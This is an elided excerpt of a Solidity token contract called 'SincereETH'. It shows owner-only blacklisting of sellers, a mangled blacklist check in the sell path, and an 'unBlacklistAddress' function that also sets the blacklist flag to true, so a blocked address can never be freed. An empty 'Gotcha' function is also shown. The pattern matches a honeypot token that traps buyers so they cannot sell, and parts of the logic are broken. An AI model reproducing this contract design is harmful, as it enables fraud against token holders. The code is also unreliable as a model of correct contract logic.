...
/* Token contract */
contract SincereETH is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV = 0x945fFDB7E0dDd4a109025a4035c0203F6fa13d8e;
    ...
    // Name and symbol
    string constant _name = "SincereETH";
    ...
    function checkTxLimit(address sender, uint256 amount, address recipient, bool isSell) internal view {
        if (recipient != owner){
            if(isSell){
                ...
                require(isBlacklisted[sender] || isBlacklisted[recipient] == false, "You are Blacklist");
            }
        }
    }
    ...
    function Gotcha() public authorized {
        
    }
   
    function blacklistAddress(address _address) public authorized{
        isBlacklisted[_address] = true;
    }

    function unBlacklistAddress(address _address) public authorized{
        isBlacklisted[_address] = true;
    }
